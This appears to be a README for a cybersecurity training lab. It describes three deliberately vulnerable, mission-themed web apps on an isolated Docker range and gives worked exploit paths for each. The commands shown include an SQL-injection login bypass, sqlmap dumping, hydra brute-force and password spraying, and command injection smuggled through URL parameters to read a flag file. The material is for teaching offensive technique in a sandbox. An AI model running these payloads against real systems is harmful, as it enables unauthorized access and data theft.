# Custom scenario target apps (the hack-lab "goal" web apps)

Each Scenario Library mission is a **real hack lab**: you drive the inline Kali shell and exploit a
small, *intentionally vulnerable* web app that is themed to the mission. These apps run **only** on
the isolated local training range (Docker `range` network, localhost-only random ports) — they are
deliberately insecure for learning and must never be exposed to a real network.

They are reachable from the Kali attacker box by service name (`target-w1`, `target-r5`, `target-c5`)
and are browsable from your machine via the random host port that `docker compose port target-xx 80`
reports. The backend surfaces those URLs in `GET /api/lab/status` (`target_urls`), which powers the
**View app** button in the hack lab.

| Scenario | App | Service / host | Vulnerabilities | Goal |
|---|---|---|---|---|
| `scn-wannacry-w1` | Mercy Health Patient Portal | `target-w1` | SQLi auth bypass; exposed `/db_backup.sql` (info disclosure) | Read patient records → capture flag |
| `scn-r5-phishing` | MediumCorp SecureMail | `target-r5` | Weak creds (brute/hydra); authenticated OS command injection | Brute login → inject → read `/flag` |
| `scn-c5-edr` | GlobalTech IT Admin Console | `target-c5` | Password spray (shared weak password); authenticated RCE runbook | Spray → execute commands → read `/flag` |

## Worked exploit paths (run these in the inline Kali shell)

Replace `target-xx` with the service name (reachable from the Kali box) — these all work on the range
network without needing the host port.

### W1 — Mercy Health Patient Portal (SQL injection)
```bash
nmap -sV target-w1
curl -s target-w1/robots.txt                 # leaks /db_backup.sql
curl -s target-w1/db_backup.sql              # dumps the user table
# SQLi auth bypass:
curl -s -X POST target-w1/login --data "username=' OR '1'='1' -- &password=x" | grep GOALCERT
# or fully automated:
sqlmap -u "http://target-w1/login" --data="username=a&password=b" --batch --dump
```

### R5 — MediumCorp SecureMail (brute → command injection)
```bash
nmap -sV target-r5
# brute the login (jdoe / Password1):
hydra -l jdoe -P /usr/share/wordlists/rockyou.txt target-r5 http-post-form \
  "/login:username=^USER^&password=^PASS^:Authentication failed"
# log in to get a session cookie, then inject via the diagnostics tool:
curl -s -c c.txt -X POST target-r5/login --data "username=jdoe&password=Password1" >/dev/null
curl -s -b c.txt "target-r5/diagnostics?host=127.0.0.1;cat%20/flag" | grep GOALCERT
```

### C5 — GlobalTech Admin Console (password spray → RCE)
```bash
nmap -sV target-c5
# spray one weak password across many admins (Welcome2024!):
hydra -L users.txt -p 'Welcome2024!' target-c5 http-post-form \
  "/login:username=^USER^&password=^PASS^:Access denied"
# log in, then run commands via the remote runbook:
curl -s -c c.txt -X POST target-c5/login --data "username=alice.chen&password=Welcome2024!" >/dev/null
curl -s -b c.txt "target-c5/console?cmd=id;cat%20/flag" | grep GOALCERT
```

## Build / run
The apps are wired into `infrastructure/docker-compose.lab.yml` (`target-w1/r5/c5`). The setup scripts
build them with the attacker image:

```powershell
pwsh infrastructure/lab-setup.ps1     # macOS/Linux: bash infrastructure/lab-setup.sh
```
